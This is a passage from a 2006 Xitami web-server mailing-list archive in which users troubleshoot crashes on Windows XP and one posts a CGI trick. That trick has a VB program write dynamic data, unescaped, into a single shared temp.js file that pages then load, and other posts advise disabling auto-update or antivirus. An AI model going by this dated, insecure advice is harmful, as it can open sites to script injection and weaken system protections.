+References: <20060220195914.GFNA2532.ibm68aec.bellsouth.net@ronscomputer>
+	<BAY105-DAV16960F9969596B372068E0F8FF0@phx.gbl>
+	<6.2.5.6.0.20060220205447.01c6bd60@mrjdesign.net>
+	<5821ea240602201305u32f908u6d8da62c0fd017e4@mail.gmail.com>
+Message-ID: <6.2.5.6.0.20060220212037.01c84cc0@mrjdesign.net>
+
+Thank you Peter. I will surely keep your email as a reference for this project.
+
+I am actually, perhaps naively so but still, not 
+very concerned about the support and community 
+issues as I can easily put together a good system for that here.
+Once we come that far, I would certainly be 
+interested in picking up some of that load from my servers side as well.
+
+Mike.
+
+
+At 21:05 20/02/2006, you wrote:
+>On 2/20/06, MRJ InfoTech Admin <admin@mrjdesign.net> wrote:
+>
+> >  I will likely try to have my company spend some time and money on this guy
+> > for a uni project and have him revise Xitami by the open source.
+>
+>That would be a fun project.  Xitami is actually quite easy to
+>improve, once you understand how the technology works.  Much easier
+>than normal multithreaded code.
+>
+>But it's a lot of work, making releases and supporting a user
+>community.  Too much work for us, we had to get back to our jobs and
+>families...
+>
+>If your friend needs any help understanding the technology, he can email me.
+>
+>-Pieter Hintjens
+>
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060220/c53426d1/attachment.htm
+From jamesamc at bellsouth.net  Tue Feb 21 01:21:55 2006
+From: jamesamc at bellsouth.net (Jeff McDonald)
+Date: Tue Feb 21 01:21:57 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <6.2.5.6.0.20060220180742.01bd2810@mrjdesign.net>
+References: <6.2.5.6.0.20060220180742.01bd2810@mrjdesign.net>
+Message-ID: <43FA5D23.40809@bellsouth.net>
+
+Is XP's native firewall running. It dose by default, and will ofton 
+interfear with other firewalls. This causes TCP/IP problems your 
+e-mail,fpt and servers may show errors to. also turn off screen savers 
+and energe savers. A http page request is not a wake on lan request.Just 
+do what i do to save my screen turn the monitor off when i'm not useing it.
+
+Jeff McDonald
+
+From admin at mrjdesign.net  Tue Feb 21 01:25:27 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Tue Feb 21 01:25:34 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <43FA5D23.40809@bellsouth.net>
+References: <6.2.5.6.0.20060220180742.01bd2810@mrjdesign.net>
+	<43FA5D23.40809@bellsouth.net>
+Message-ID: <6.2.5.6.0.20060221002254.01c8d988@mrjdesign.net>
+
+I have no use for a screen saver as I don't have a screen on the machine. :)
+
+And no, the native firewall only runs on XP boxes 
+that has one. I was not "PutSuitableWordHere"
+enough to install the SP2 that adds #Nth errors 
+to an O/S that already had 250 on there to begin with.
+
+Amazingly stupid to release a SP that disables 
+both generic Norton and McAffee anti viruses.
+
+We'll see how the power save turned off pans out. 
+It's still running as is now though since I did.
+
+
+At 00:21 21/02/2006, you wrote:
+>Is XP's native firewall running. It dose by 
+>default, and will ofton interfear with other 
+>firewalls. This causes TCP/IP problems your 
+>e-mail,fpt and servers may show errors to. also 
+>turn off screen savers and energe savers. A http 
+>page request is not a wake on lan request.Just 
+>do what i do to save my screen turn the monitor off when i'm not useing it.
+>
+>Jeff McDonald
+>
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060221/9a2624e0/attachment.html
+From admin at mrjdesign.net  Tue Feb 21 04:20:39 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Tue Feb 21 04:20:47 2006
+Subject: [Xitami] Server stabile,
+ now the log files entires - Security issue or not?
+Message-ID: <6.2.5.6.0.20060221031610.01bd3b20@mrjdesign.net>
+
+Ok... server still hanging in there.
+In fact I disabled the access log and retain only 
+error log and other logs generated by Xitami.
+Disabled all the power saving features and stuff, 
+and the server seems to run a little bit more stabile.
+
+Now I have another security related question, and 
+more along the files of the contents of the log files and some odd entries.
+
+
+has anyone ever seen an entry such as this to their log files before???
+
+
+24.136.142.39 - - [21/Feb/2006:03:00:45 +0000] 
+"harset: ISO-8859-1,utf-8;q=0.7,*;q=0.7" 501 0 "" ""
+
+This is done by the std. CLFX formatted log file 
+and pulled from my errors.log after I turned off access log.
+
+There is apparently only one entry in there. Now 
+I wonder, did osmeone try to pull a C# or .NET fast one and
+accessing my keyboard hooks or is this a thing 
+produced by this earthlink users browser suddenly 
+not reading all file data correctly?
+
+Thankful for any insight in this since this bugs 
+me more than the server shutting down.
+
+M
+
+
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060221/558ab6ac/attachment.htm
+From ronackgen01 at bellsouth.net  Thu Feb 23 04:59:11 2006
+From: ronackgen01 at bellsouth.net (Ron Ackerman)
+Date: Thu Feb 23 04:53:52 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <6.2.5.6.0.20060221002254.01c8d988@mrjdesign.net>
+Message-ID: <20060223035343.ILZC5432.ibm63aec.bellsouth.net@ronscomputer>
+
+Interesting, I've had 2 crashes today both with runtime error.
+
+   _____  
+
+From: xitami-bounces@lists.xitami.org
+[mailto:xitami-bounces@lists.xitami.org] On Behalf Of MRJ InfoTech Admin
+Sent: Monday, February 20, 2006 7:25 PM
+To: jamesamc@bellsouth.net; Xitami Users General Discussion
+Subject: Re: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+
+
+I have no use for a screen saver as I don't have a screen on the machine. :)
+
+And no, the native firewall only runs on XP boxes that has one. I was not
+"PutSuitableWordHere" 
+enough to install the SP2 that adds #Nth errors to an O/S that already had
+250 on there to begin with.
+
+Amazingly stupid to release a SP that disables both generic Norton and
+McAffee anti viruses.
+
+We'll see how the power save turned off pans out. It's still running as is
+now though since I did.
+
+
+At 00:21 21/02/2006, you wrote:
+
+
+Is XP's native firewall running. It dose by default, and will ofton
+interfear with other firewalls. This causes TCP/IP problems your e-mail,fpt
+and servers may show errors to. also turn off screen savers and energe
+savers. A http page request is not a wake on lan request.Just do what i do
+to save my screen turn the monitor off when i'm not useing it.
+
+Jeff McDonald
+
+
+--
+Xitami Users Mailing List -- For Xitami support
+To unsubscribe: HYPERLINK
+"http://lists.xitami.org/mailman/listinfo/xitami"http://lists.xitami.org/mai
+lman/listinfo/xitami
+
+
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    HYPERLINK
+"http://www.mrjdesign.net/"http://www.mrjdesign.net 
+
+
+
+
+--
+No virus found in this incoming message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 267.15.12/265 - Release Date: 2/20/2006
+
+
+
+-- 
+No virus found in this outgoing message.
+Checked by AVG Free Edition.
+Version: 7.1.375 / Virus Database: 268.0.0/266 - Release Date: 2/21/2006
+ 
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060222/fabe489f/attachment.html
+From admin at mrjdesign.net  Thu Feb 23 04:59:17 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Thu Feb 23 04:59:26 2006
+Subject: [Xitami] Urgent- server crashes Xitami 2.5c2 on XP
+In-Reply-To: <20060223035343.ILZC5432.ibm63aec.bellsouth.net@ronscompute
+ r>
+References: <6.2.5.6.0.20060221002254.01c8d988@mrjdesign.net>
+	<20060223035343.ILZC5432.ibm63aec.bellsouth.net@ronscomputer>
+Message-ID: <6.2.5.6.0.20060223035723.01c62800@mrjdesign.net>
+
+Interesting indeed.
+The next time it does, will you do me a favor and see if we get the same error.
+
+Catch exactly what it says in the title of the popup window that 
+follows the error and I'll see if I cant write a quick-fix for it here.
+
+Mine works outright fine for now since I turned off all powersave 
+functions, including turn off monitor or hdd after XX minutes option, 
+and I disabled Activity logging and only keep error log, console log 
+and Xitami.log enabled.
+
+
+At 03:59 23/02/2006, you wrote:
+>Interesting, I've had 2 crashes today both with runtime error.
+>
+>
+>----------
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060223/e863ed13/attachment.htm
+From bsb_2 at mail.bg  Thu Feb 23 07:56:41 2006
+From: bsb_2 at mail.bg (Boyan Brezinsky)
+Date: Thu Feb 23 07:56:59 2006
+Subject: [Xitami] Re: Urgent- server crashes Xitami 2.5c2
+In-Reply-To: <20060221110010.58EC41C109C9@sxpublic.imatix.net>
+References: <20060221110010.58EC41C109C9@sxpublic.imatix.net>
+Message-ID: <1140677801.27a8a11ee6836@mail.bg>
+
+
+> Ok... server still hanging in there.
+> In fact I disabled the access log and retain only
+> error log and other logs generated by Xitami.
+> Disabled all the power saving features and stuff,
+> and the server seems to run a little bit more stabile.
+>
+
+Did you go into Device Manager, then to the LAN card(s) ->
+Properties -> Power Management and uncheck "Allow the
+computer to turn off this device to save power"? I just
+found that this was enabled on my machine (XP SP2, a
+desktop machine), so I presume this is the setting by
+default, as long as the NIC drivers support it.
+And maybe it is still worth removing Norton Antivirus for a
+while, just for the test. If the server is not a file
+server, then the lack of antivirus software for some time
+won't do it much harm.
+
+Boyan
+
+
+-----------------------------
+
+IDG.BG
+???????????? ?? ?????? ?? ??????, ???? ? ????????.
+http://idg.bg/
+
+From admin at mrjdesign.net  Thu Feb 23 09:43:16 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Thu Feb 23 09:43:21 2006
+Subject: [Xitami] Re: Urgent- server crashes Xitami 2.5c2
+In-Reply-To: <1140677801.27a8a11ee6836@mail.bg>
+References: <20060221110010.58EC41C109C9@sxpublic.imatix.net>
+	<1140677801.27a8a11ee6836@mail.bg>
+Message-ID: <6.2.5.6.0.20060223084004.01bdc810@mrjdesign.net>
+
+
+>
+>Did you go into Device Manager, then to the LAN card(s) ->
+>Properties -> Power Management and uncheck "Allow the
+>computer to turn off this device to save power"? I just
+>found that this was enabled on my machine (XP SP2, a
+>desktop machine), so I presume this is the setting by
+>default, as long as the NIC drivers support it.
+
+This is only on SP2 but default on all XP SP1 and up.
+I am on SP1 and that thing is one of the first I kill with any fresh 
+install (^^)
+
+Also things like auto update, remote assistance and system restore will
+get a well placed kick in the complexity before I go on line and 
+update the avir and anti spybot  (^^)
+
+>And maybe it is still worth removing Norton Antivirus for a
+>while, just for the test. If the server is not a file
+>server, then the lack of antivirus software for some time
+>won't do it much harm.
+>
+>Boyan
+
+Not needed. But Norton has never done any harm to my setup.
+Apparently after turning off log files for activity logging and the 
+power save totally, it works fine. 
+
+
+
+
+From a.drent at rug.nl  Thu Feb 23 09:54:58 2006
+From: a.drent at rug.nl (A Drent)
+Date: Thu Feb 23 09:55:10 2006
+Subject: [Xitami] Re: Urgent- server crashes Xitami 2.5c2
+References: <20060221110010.58EC41C109C9@sxpublic.imatix.net><1140677801.27a8a11ee6836@mail.bg>
+	<6.2.5.6.0.20060223084004.01bdc810@mrjdesign.net>
+Message-ID: <006801c63856$d3623750$d50110ac@test123>
+
+I'm sorry if this post is off-topic, I'm currently following this thread. I 
+too had problems with crashes and I didn't manage to solve this. I 
+experimented a lot and the problem occurred both in 4 branch as in 5 branch. 
+I was using Xitami within a perl  connection to an application server 
+connected to MySQL. I have seen posts here that MySQL settings had influence 
+on the working of Xitami, but the crashes occurred very irregular, sometimes 
+several times a day, sometimes it went well for over a week. It also isn't 
+very stable if cgi apps with soap connections are used with similar problems 
+(again using MySQL for whatever it's worth). Any similarities?
+
+regards, Albert
+
+
+
+----- Original Message ----- 
+From: "MRJ InfoTech Admin" <admin@mrjdesign.net>
+To: "Xitami Users General Discussion" <xitami@lists.xitami.org>
+Sent: Thursday, February 23, 2006 9:43 AM
+Subject: Re: [Xitami] Re: Urgent- server crashes Xitami 2.5c2
+
+
+>
+>>
+>>Did you go into Device Manager, then to the LAN card(s) ->
+>>Properties -> Power Management and uncheck "Allow the
+>>computer to turn off this device to save power"? I just
+>>found that this was enabled on my machine (XP SP2, a
+>>desktop machine), so I presume this is the setting by
+>>default, as long as the NIC drivers support it.
+>
+> This is only on SP2 but default on all XP SP1 and up.
+> I am on SP1 and that thing is one of the first I kill with any fresh 
+> install (^^)
+>
+> Also things like auto update, remote assistance and system restore will
+> get a well placed kick in the complexity before I go on line and update 
+> the avir and anti spybot  (^^)
+>
+>>And maybe it is still worth removing Norton Antivirus for a
+>>while, just for the test. If the server is not a file
+>>server, then the lack of antivirus software for some time
+>>won't do it much harm.
+>>
+>>Boyan
+>
+> Not needed. But Norton has never done any harm to my setup.
+> Apparently after turning off log files for activity logging and the power 
+> save totally, it works fine.
+>
+>
+>
+>
+> --
+> Xitami Users Mailing List -- For Xitami support
+> To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+> 
+
+
+From admin at mrjdesign.net  Thu Feb 23 10:08:26 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Thu Feb 23 10:08:31 2006
+Subject: [Xitami] Re: Urgent- server crashes Xitami 2.5c2
+In-Reply-To: <006801c63856$d3623750$d50110ac@test123>
+References: <20060221110010.58EC41C109C9@sxpublic.imatix.net>
+	<1140677801.27a8a11ee6836@mail.bg>
+	<6.2.5.6.0.20060223084004.01bdc810@mrjdesign.net>
+	<006801c63856$d3623750$d50110ac@test123>
+Message-ID: <6.2.5.6.0.20060223090012.01c35df0@mrjdesign.net>
+
+
+I don't use MySQL at all. At least not yet, 
+because I noticed that MySQL 5 builds up and 
+steals 11 MB RAM just to not do nothing but sit there.
+I am not sure what you mean by 4 branch and 5 branch here. Please elaborate.
+
+I don't use Perl either because I like stuff 
+that's compiled before I run it, and something I 
+can manage to read after it was written /*chuckles
+
+I do however use a frequent amount of ADO and 
+MSJet towards Access databases in CGI's made using VB.
+They do put a nice load on the server CPU but 
+only for very short periods of time and
+they don't affect the Xitami at all except for the execution time.
+
+In fact, I have one web site running on my server 
+now, using one of my CGI's handling over 45,000 images,
+viewer stats and image stats all from one file 
+towards a single access database and they don't seem to have
+any problems whatsoever getting thousands of hits 
+weekly. (20,000 page views in 2 1/2 weeks)
+
+Another web site I host is running straight 
+forward HTML and just one JAVA applet and that bad boy
+is running up logs like crazy and sometimes takes 
+for ever to load individual pages. Especially on the Java part.
+
+The only time I've noticed any trouble with the 
+CGI is when there is Perl involved for some reason.
+Perhaps an interpreter issue in the back of it. I 
+don't know and I am still waiting for my guru in Denmark to show up.
+
+I am not sure how SOAP would compare with that.
+
+- M.
+
+At 08:54 23/02/2006, you wrote:
+>I'm sorry if this post is off-topic, I'm 
+>currently following this thread. I too had 
+>problems with crashes and I didn't manage to 
+>solve this. I experimented a lot and the problem 
+>occurred both in 4 branch as in 5 branch. I was 
+>using Xitami within a perl  connection to an 
+>application server connected to MySQL. I have 
+>seen posts here that MySQL settings had 
+>influence on the working of Xitami, but the 
+>crashes occurred very irregular, sometimes 
+>several times a day, sometimes it went well for 
+>over a week. It also isn't very stable if cgi 
+>apps with soap connections are used with similar 
+>problems (again using MySQL for whatever it's worth). Any similarities?
+>
+>regards, Albert
+>
+>
+>
+>----- Original Message ----- From: "MRJ InfoTech Admin" <admin@mrjdesign.net>
+>To: "Xitami Users General Discussion" <xitami@lists.xitami.org>
+>Sent: Thursday, February 23, 2006 9:43 AM
+>Subject: Re: [Xitami] Re: Urgent- server crashes Xitami 2.5c2
+>
+>
+>>
+>>>
+>>>Did you go into Device Manager, then to the LAN card(s) ->
+>>>Properties -> Power Management and uncheck "Allow the
+>>>computer to turn off this device to save power"? I just
+>>>found that this was enabled on my machine (XP SP2, a
+>>>desktop machine), so I presume this is the setting by
+>>>default, as long as the NIC drivers support it.
+>>
+>>This is only on SP2 but default on all XP SP1 and up.
+>>I am on SP1 and that thing is one of the first 
+>>I kill with any fresh install (^^)
+>>
+>>Also things like auto update, remote assistance and system restore will
+>>get a well placed kick in the complexity before 
+>>I go on line and update the avir and anti spybot  (^^)
+>>
+>>>And maybe it is still worth removing Norton Antivirus for a
+>>>while, just for the test. If the server is not a file
+>>>server, then the lack of antivirus software for some time
+>>>won't do it much harm.
+>>>
+>>>Boyan
+>>
+>>Not needed. But Norton has never done any harm to my setup.
+>>Apparently after turning off log files for 
+>>activity logging and the power save totally, it works fine.
+>>
+>>
+>>
+>>
+>>--
+>>Xitami Users Mailing List -- For Xitami support
+>>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+>
+>
+>--
+>Xitami Users Mailing List -- For Xitami support
+>To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+>
+
+-?2005-------------------------------
+MRJ Information Technology Ltd.
+35 Camden High St., Camden/London, NW1 7JE
+United Kingdom    http://www.mrjdesign.net
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060223/956cd29b/attachment.html
+From a.drent at rug.nl  Fri Feb 24 21:49:27 2006
+From: a.drent at rug.nl (A Drent)
+Date: Fri Feb 24 21:49:38 2006
+Subject: [Xitami] Re: Urgent- server crashes Xitami 2.5c2
+References: <20060221110010.58EC41C109C9@sxpublic.imatix.net><1140677801.27a8a11ee6836@mail.bg><6.2.5.6.0.20060223084004.01bdc810@mrjdesign.net><006801c63856$d3623750$d50110ac@test123>
+	<6.2.5.6.0.20060223090012.01c35df0@mrjdesign.net>
+Message-ID: <007a01c63983$cd4d6be0$d50110ac@test123>
+
+Wiht the 4 and 5 branch I meant that I have tested2.4 and 2.5 in several releases, but they gave the same result.  I have p;osted on this discussion list questions about strange crashes but never got any answers. I too like compiled stuff in favor of php/perl, but my applications servers are fed by a very small perl script just passing data through to the app server and back. Under  certain circumstances (I realy do not know when )  the webserver crashes the same way you described. I also have a soap cgi applications (webservice built in Delphi ) running on Xitami giving the same results. Finally I noticed that the FTP part of Xitami is not stable at all. Being honest I was running Xitami for years just doing html stuff without any crashes at all. But since I was using  cgi applications and webscripting I simply couldnt get a stable environment. I'm using Apache now w.o. any problems,  but since Xitami is very easy to maintain (no difficult setup files), very small, I would surely like to use Xitami. But there's some isue here I couldn;t find. That's why I'm very interested in this thread because I hope to find out what I'm doing wrong or to find out it's a bug to be solved...
+
+albert
+  ----- Original Message ----- 
+  From: MRJ InfoTech Admin 
+  To: Xitami Users General Discussion 
+  Sent: Thursday, February 23, 2006 10:08 AM
+  Subject: Re: [Xitami] Re: Urgent- server crashes Xitami 2.5c2
+
+
+
+  I don't use MySQL at all. At least not yet, because I noticed that MySQL 5 builds up and steals 11 MB RAM just to not do nothing but sit there.
+  I am not sure what you mean by 4 branch and 5 branch here. Please elaborate.
+
+  I don't use Perl either because I like stuff that's compiled before I run it, and something I can manage to read after it was written /*chuckles
+
+  I do however use a frequent amount of ADO and MSJet towards Access databases in CGI's made using VB.
+  They do put a nice load on the server CPU but only for very short periods of time and 
+  they don't affect the Xitami at all except for the execution time.
+
+  In fact, I have one web site running on my server now, using one of my CGI's handling over 45,000 images, 
+  viewer stats and image stats all from one file towards a single access database and they don't seem to have
+  any problems whatsoever getting thousands of hits weekly. (20,000 page views in 2 1/2 weeks)
+
+  Another web site I host is running straight forward HTML and just one JAVA applet and that bad boy
+  is running up logs like crazy and sometimes takes for ever to load individual pages. Especially on the Java part.
+
+  The only time I've noticed any trouble with the CGI is when there is Perl involved for some reason.
+  Perhaps an interpreter issue in the back of it. I don't know and I am still waiting for my guru in Denmark to show up.
+
+  I am not sure how SOAP would compare with that.
+
+  - M.
+
+  At 08:54 23/02/2006, you wrote:
+
+    I'm sorry if this post is off-topic, I'm currently following this thread. I too had problems with crashes and I didn't manage to solve this. I experimented a lot and the problem occurred both in 4 branch as in 5 branch. I was using Xitami within a perl  connection to an application server connected to MySQL. I have seen posts here that MySQL settings had influence on the working of Xitami, but the crashes occurred very irregular, sometimes several times a day, sometimes it went well for over a week. It also isn't very stable if cgi apps with soap connections are used with similar problems (again using MySQL for whatever it's worth). Any similarities?
+
+    regards, Albert
+
+
+
+    ----- Original Message ----- From: "MRJ InfoTech Admin" <admin@mrjdesign.net>
+    To: "Xitami Users General Discussion" <xitami@lists.xitami.org>
+    Sent: Thursday, February 23, 2006 9:43 AM
+    Subject: Re: [Xitami] Re: Urgent- server crashes Xitami 2.5c2
+
+
+
+
+
+
+        Did you go into Device Manager, then to the LAN card(s) ->
+        Properties -> Power Management and uncheck "Allow the
+        computer to turn off this device to save power"? I just
+        found that this was enabled on my machine (XP SP2, a
+        desktop machine), so I presume this is the setting by
+        default, as long as the NIC drivers support it.
+
+      This is only on SP2 but default on all XP SP1 and up.
+      I am on SP1 and that thing is one of the first I kill with any fresh install (^^)
+
+      Also things like auto update, remote assistance and system restore will
+      get a well placed kick in the complexity before I go on line and update the avir and anti spybot  (^^)
+
+
+        And maybe it is still worth removing Norton Antivirus for a
+        while, just for the test. If the server is not a file
+        server, then the lack of antivirus software for some time
+        won't do it much harm.
+
+        Boyan
+
+      Not needed. But Norton has never done any harm to my setup.
+      Apparently after turning off log files for activity logging and the power save totally, it works fine.
+
+
+
+
+      --
+      Xitami Users Mailing List -- For Xitami support
+      To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+
+
+
+    --
+    Xitami Users Mailing List -- For Xitami support
+    To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+
+
+  -?2005-------------------------------
+  MRJ Information Technology Ltd.
+  35 Camden High St., Camden/London, NW1 7JE
+  United Kingdom    http://www.mrjdesign.net 
+
+
+
+
+------------------------------------------------------------------------------
+
+
+
+  --
+  Xitami Users Mailing List -- For Xitami support
+  To unsubscribe: http://lists.xitami.org/mailman/listinfo/xitami
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: http://lists.imatix.org/pipermail/xitami/attachments/20060224/4f368835/attachment.htm
+From admin at mrjdesign.net  Sat Feb 25 21:01:57 2006
+From: admin at mrjdesign.net (MRJ InfoTech Admin)
+Date: Sat Feb 25 21:02:06 2006
+Subject: [Xitami] Re: Urgent- server crashes Xitami 2.5c2 (and some
+	CGI hints)
+In-Reply-To: <007a01c63983$cd4d6be0$d50110ac@test123>
+References: <20060221110010.58EC41C109C9@sxpublic.imatix.net>
+	<1140677801.27a8a11ee6836@mail.bg>
+	<6.2.5.6.0.20060223084004.01bdc810@mrjdesign.net>
+	<006801c63856$d3623750$d50110ac@test123>
+	<6.2.5.6.0.20060223090012.01c35df0@mrjdesign.net>
+	<007a01c63983$cd4d6be0$d50110ac@test123>
+Message-ID: <6.2.5.6.0.20060225192056.01bd77f8@mrjdesign.net>
+
+
+Thank you for explaining the 4 and 5...
+
+I've used Xitami since I first started doing basic HTML code on my 
+own just to have something to test it with,
+instead of the old angelfire web sites as where massively popular back in 1995.
+
+I think I am coming to a couple of conclusions in this Xitami bug 
+issue, and they may be wrong,
+until I get more into the source of the applications themselves, but 
+here goes nothing.
+
+1) The FTP server should clearly not be used.
+     I have tried several other server versions, but what I like with 
+Xitami is the simple and straight
+     forward VHosting setup and that has lead me to keep running it 
+until just a few weeks back.
+
+    In fact I have always truly disliked Apache because of the setup 
+and configuration that is so different than Xitami.
+
+  I have tried RaidenFTP and I really like how stabile it is, how 
+relatively easy it is to set up on a single
+  machine but it's a nightmare trying to write a cgi myself to add or 
+remove users. Xitami is unbeatable on ease of use there.
+Also, there has to be some way they can keep a nag screen in the 
+program without requiring the user who is
+testing it to click on their web site ever 1 - 3 hours to keep the 
+server alive. It's not only ridiculous but plain stupidly annoying so 
+I dumped it.
+
+Now I am testing Platypus FTP server that also support FTPS however 
+it is very sluggish, takes for ever to refresh the remote side window 
+in the client application.
+Doesn't strike me as stabile at all.
+
+So, in regards to Xitami, I disabled the FTP to begin with. This 
+removed approx. 75% of all crashes, and in particular the one popping 
+up showing C++ errors.
+The C++ error leads me to believe there is something in Xitami that 
+was not quite written right for an XP machine. After all, the later 
+editions of XP, including later installs of SP1 versions does have 
+things now included that did not exist back when Xitami's latest 
+version was undergoing the highest attention I bet.
+
+
+2) The CGI environment. Yes, you're absolutely right that it looks 
+like parsing pages through an interpretor takes longer time and puts 
+a certain load on your server.
+
+Even more so if you add PHP that require a special parser and MIME 
+entry to run. PERL is a bit more stabile here, however, I write 
+mostly VB based compiled stuff, and the way I write it, it's intended 
+to run server side and just return a minimal amount of data to the 
+browser where needed.
+
+Since I can't figure out how I first managed to get VBS to run on 
+Xitami, I am stuck relearning a lot of my old JavaScript, and trying 
+to reduce the load on the server, by pushing most of the front end 
+stuff to the client this way. It's actually fairly simple to do, once 
+you get an idea as how it runs behind the scene.
+
+More about this below. but first...
+
+3) The LOG files! Apparently a big culprit in causing errors.
+
+There has to be some majestic buildup of data in this processing 
+because of the following.
+
+A) As soon I reach close to or over 8000 hits in the properties 
+window field Hits: I risk having a crash.
+B) If the sum of all hits add up in the kb transfered field, to over 
+1,000,000, I know it's coming sooner or later.
+C) If you run several VHost sites, I noticed, simply by opening the 
+logs folder, to see that all sites hits are not stored in individual 
+log files as one would assume.
+
+Lets assume I have SiteA.log, SiteB.log, SiteC.log
+
+I set the log files to cycle daily, without regard for any max size 
+of the log files, and instead I end up with log files like this...
+
+SiteA.log + 10 Kb
+SiteB.log = 5,006 Kb
+SiteC.log = 490 kb
+
+
+I know, that this is wrong because SiteA.log should be huge and has 
+25 times more hits than
+SiteC, that currently stands for more than 95% of my mail servers 
+traffic for instance.
+
+In addition, I get Ac20022006log.001, Ac20022006log.002, 
+Ac20022006log.003, Ac20022006log.004
+all containing hits from all of the above.
+
+How can that be "individual logging" for each vhost?  (makes a note 
+to self for this years project with studying Xitami source to stop 
+this concatenation of log files.)
+
+I just completed a minor CGI that will write my own logs instead, 
+saving each site for instance for my main domain as 
+www.mrjdesign.net25022006.log for todays hits.
+If I add another vhost, it will log in it's own domain+date and if 
+the Cycle24hr is true, then it auto generates a new file every 24 
+hours, otherwise every hour.
+
+I turned off, the access log, kept the error log and xitami.log 
+active, and voila, another 80% of all crash prone activities died.
+
+In all honesty, I did turn of powersave, "turn off monitor after", 
+and the "turn off harddisks after" settings as well.
+Why you might ask, but someone suggested there was a backend issue 
+with them, and perhaps this leads back
+to my original theory above that something in C++ is conflicting with 
+how the powersave is handled.
+
+=== In conclusion
+
+Since I did these changes and tests, I have had ONE server crash, and 
+it was not on the main server but the developer station,
+when I executed a cgi, repeatedly, in fact 1,338 times in the time 
+span of less than 30 seconds.
+
+I doubt in this case it was caused by the CGI, but once again a log 
+file problem.
+The CGI was executed through a javascript that kept calling the page, 
+and it could not find one of the components the page referred to.
+As such the error log kept building up instead, and thats when it crashed.
+
+=== Now for something much more fun I noticed.
+
+If you execute a CGI, try calling it by passing a action tag through 
+JavaScript rather than calling it by other methods.
+Why? you might ask.
+
+It's quite simple, if you look at how the processes are executed.
+
+Xitami is pretty strict on the time-out settings fro cgi's, and in my 
+case I have it at 60 seconds by default.
+Consider the one site I mentioned before, executing a check of 47,000 
+images in a mdb file, towards a
+VB cgi, running on xitami, its is sometimes dead slow when I have 
+many visitors.
+
+On the other hand, I have not yet had a time out error on that CGI, 
+and it controls everything from logging
+hits per thumbnail, hits per thumbnail page, visitors locations, and 
+much more. (including looping and building thumbs pages)
+
+Now, I tried something new, and found to my surprise it actually 
+works pretty good.
+
+(lets hope the mail server doesnt think this is a html include here now)
+
+<script src="http://yoursite.com/cgi-bin/YourCgi.exe"></script>
+
+placed anywhere in your html page will execute the cgi as if you had 
+clicked the submit button in a form.
+
+So will the following...
+
+<script src="http://yoursite.com/cgi-bin/YourController.js"></script>
+
+containing the script line ...
+
+document.write("<script 
+src=\"http://yoursite.com/cgi-bin/YourCgi.exe?PARAM1="+ What 
+YouGotElsewhere +"&PARAM2="+ SomeOtherDynamicBit +"\"></script>");
+
+
+This means, you can execute a huge collection of data through java 
+script, build a connect string to your cgi and execute the cgi before 
+it does the following...
+
+The cgi in this case cannot push any data back to the calling page 
+directly... so now we include a statement in the cgi saying
+
+(this is VB guys)
+
+'get out of the cgi  bin into the webpages directory of xitami...
+sFILE = App.path "\..\webpages\temp.js"
+FN = FreeFile
+open sFILE for Output As #FN
+Print #FN, "<!-- //"
+Print #FN, "document.write(""Hello World, here is my temp value " & 
+varDataFromCGI & """);"
+Print #FN, "//  -->"
+Close #FN
+
+
+
+Since Xitami, and any decent server, slows down while the CGI is 
+running, this gives you a whole
+60 seconds to run what you are doing, produce this temp file and then 
+return the processing to
+the calling HTML document again.
+
+
+Now, once the document is release... we are back in the body of the 
+HTML page and there you have the following code...
+AFTER the CGI and JS mix...
+
+
+<script src="http://yoursite.com/tmp.js"></script>
+
+and voila, there is your output, without pushing anything from the 
+CGI to the HTML directly.
+
+And from what I can tell, you can do this over and over and over, 
+like a energizer bunny with a lot less stress on the server itself.
+It's partly because now you pushed some of the details down to the 
+user, and the CGI processing is only holding a thread for
+the server but not communicating back as much as it otherwise would 
+with stdio routines.
+
+Well... I hope this is useful to you all. Otherwise I just spent 30 
+minutes potential sleeping time typing for nothing >.<
+
+- Mike J.
+
+
+
+
+From craighp at 2cah.com  Sat Feb 25 22:53:09 2006
+From: craighp at 2cah.com (Craig Morrison)
